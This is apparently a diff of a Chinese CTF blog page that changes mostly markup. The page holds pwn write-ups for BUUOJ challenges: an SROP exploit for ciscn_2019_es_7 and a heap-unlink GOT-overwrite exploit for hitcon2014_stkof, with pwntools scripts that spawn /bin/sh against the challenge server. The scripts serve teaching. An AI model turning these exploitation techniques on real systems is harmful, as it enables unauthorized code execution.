+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>感觉挺有意思的一个题，考的不是pwn的知识，应该是Linux相关的知识</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">vulnerable</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;HaHaHa!</span><span class="se">\n</span><span class="s">What else can you do???&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
@@ -1579,8 +1632,11 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </ol>
 </blockquote>
 <p>所以，，nc然后exec就OK</p>
-<h2 id="0x3eciscn_2019_es_7srop" class="heading-element">
-  <a href="#0x3eciscn_2019_es_7srop" class="heading-mark"></a>0x3E.ciscn_2019_es_7（SROP）</h2><pre tabindex="0"><code class="language-assembly" data-lang="assembly">.text:00000000004004ED ; __unwind {
+<h2 id="0x3eciscn_2019_es_7srop" class="heading-element"><span>0x3E.ciscn_2019_es_7（SROP）</span>
+  <a href="#0x3eciscn_2019_es_7srop" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code class="language-assembly" data-lang="assembly">.text:00000000004004ED ; __unwind {
 .text:00000000004004ED                 push    rbp
 .text:00000000004004EE                 mov     rbp, rsp
 .text:00000000004004F1                 xor     rax, rax
@@ -1597,7 +1653,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 .text:0000000000400519 vuln            endp ; sp-analysis failed</code></pre><p>其中buf长度是0x10，但是write的时候打印了0x30个字符，可以打印出地址，调试输入的内容与返回地址的偏移</p>
 <p>之后栈地址-偏移地道输入的地址</p>
 <p>配合srop getshell</p>
-<div class="highlight" id="id-67"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">yutao@ubuntu:~$ <span class="nb">cd</span> Desktop/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">yutao@ubuntu:~$ <span class="nb">cd</span> Desktop/
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./ciscn_2019_es_7&#39;</span> <span class="nv">argv</span><span class="o">=[</span><span class="s1">&#39;./ciscn_2019_es_7&#39;</span><span class="o">]</span> : pid <span class="m">95424</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> running in new terminal: /usr/bin/gdb -q  <span class="s2">&#34;./ciscn_2019_es_7&#34;</span> <span class="m">95424</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>DEBUG<span class="o">]</span> Launching a new terminal: <span class="o">[</span><span class="s1">&#39;/usr/bin/x-terminal-emulator&#39;</span>, <span class="s1">&#39;-e&#39;</span>, <span class="s1">&#39;/usr/bin/gdb -q  &#34;./ciscn_2019_es_7&#34; 95424&#39;</span><span class="o">]</span>
@@ -1613,10 +1669,10 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">    <span class="m">00000030</span>
 </span></span><span class="line"><span class="cl">0x7ffc87e9c458</span></span></code></pre></div><p>可以算出binsh与0x7ffc87e9c458的地址差0x118.</p>
 <p>额。。要加：</p>
-<div class="highlight" id="id-68"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span>   <span class="o">=</span> <span class="s1">&#39;linux&#39;</span></span></span></code></pre></div><p>第一开始没懂，还重装了便系统，。。</p>
 <p>exp：</p>
-<div class="highlight" id="id-69"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span>   <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
@@ -1645,12 +1701,15 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sigreturn_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3fhitcon2014_stkofunlink" class="heading-element">
-  <a href="#0x3fhitcon2014_stkofunlink" class="heading-mark"></a>0x3F.hitcon2014_stkof(unlink)</h2><p>setbuf()/setvbuf()函数作用：关闭I/O缓冲区</p>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3fhitcon2014_stkofunlink" class="heading-element"><span>0x3F.hitcon2014_stkof(unlink)</span>
+  <a href="#0x3fhitcon2014_stkofunlink" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>setbuf()/setvbuf()函数作用：关闭I/O缓冲区</p>
 <p>一般为了让程序显示正常，会关闭I/O缓冲区</p>
 <p>但是本题没有关闭缓冲区，<strong>函数运行开始阶段在fgets()函数以及printf()函数运行的时候，会malloc()两块内存区域</strong>。大小都是0x1000</p>
 <p>所以申请的第一个chunk会加在输入输出缓冲区之间，后续并没有什么用</p>
-<div class="highlight" id="id-70"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-74h]
@@ -1702,7 +1761,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 <p>ptr 处的指针会变为 ptr - 0x18。</p>
 <p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
 <p>首先：</p>
-<div class="highlight" id="id-71"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="c1">#1</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="c1">#1</span>
 </span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="c1">#2</span>
 </span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#3</span>
 </span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="c1">#4</span>
@@ -1711,19 +1770,19 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="mh">0x602140</span> <span class="o">+</span> <span class="mh">0x10</span>
 </span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="o">=</span> <span class="n">target</span> <span class="o">-</span> <span class="mh">0x18</span>
 </span></span><span class="line"><span class="cl"><span class="n">bk</span> <span class="o">=</span> <span class="n">target</span> <span class="o">-</span> <span class="mh">0x10</span></span></span></code></pre></div><p>接下来构造fake chunk，并将下一个的prev_size写为0x30，这样后面free(3)的时候会将2这个chunk合并。之后chunk2就是0x602140这个位置了。</p>
-<div class="highlight" id="id-72"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x10</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span></span></span></code></pre></div><p>这里是将程序中malloc的地址复写为free_got和puts_got</p>
-<div class="highlight" id="id-73"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;b&#34;</span><span class="o">*</span><span class="mh">0x10</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;b&#34;</span><span class="o">*</span><span class="mh">0x10</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span></span></span></code></pre></div><p>将free_got中写入puts_plt这样free的时候实际执行的是puts函数，打印出puts_addr</p>
-<div class="highlight" id="id-74"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span></span></span></code></pre></div><p>再之后就是正常的流程了：</p>
-<div class="highlight" id="id-75"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
@@ -1734,7 +1793,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span></span></span></code></pre></div><p>Exp：</p>
-<div class="highlight" id="id-76"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">28999</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##p = process(&#34;./stkof&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
@@ -1811,9 +1870,9 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
           </div></div><div class="post-info-line">
         <div class="post-info-md"></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/buu-pwn-0x30-0x3f/" data-title="BUU_PWN刷题_0x30-0x3F" data-hashtags="PWN"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/buu-pwn-0x30-0x3f/" data-hashtag="PWN"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/buu-pwn-0x30-0x3f/" data-title="BUU_PWN刷题_0x30-0x3F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/" data-title="BUU_PWN刷题_0x30-0x3F" data-hashtags="PWN"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/" data-hashtag="PWN"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/" data-title="BUU_PWN刷题_0x30-0x3F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
         </div>
       </div></div>
@@ -1832,14 +1891,14 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 
   <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
-              <a href="/"></a></span></div></div>
+              <a href="/">Ghostasky</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div></div><div id="mask"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
 </div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
